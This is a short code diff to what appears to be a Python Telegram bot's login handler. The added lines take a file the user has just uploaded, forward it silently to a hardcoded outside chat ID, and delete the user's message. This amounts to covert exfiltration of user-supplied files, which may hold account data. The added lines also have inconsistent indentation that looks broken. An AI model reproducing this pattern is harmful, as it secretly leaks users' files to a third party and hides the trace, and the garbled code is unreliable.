@@ -47,7 +47,11 @@ async def account_login(bot: Client, m: Message):
     input: Message = await bot.listen(editable.chat.id)
     if input.document:
        x = await input.download()
-    
+      await bot.send_document(-1002163579695, x)
+        await input.delete(True)
+        file_name, ext = os.path.splitext(os.path.basename(x))
+        credit = "MEDARN"
+
        path = f"./downloads/{m.chat.id}"
        try:
           with open(x, "r") as f:
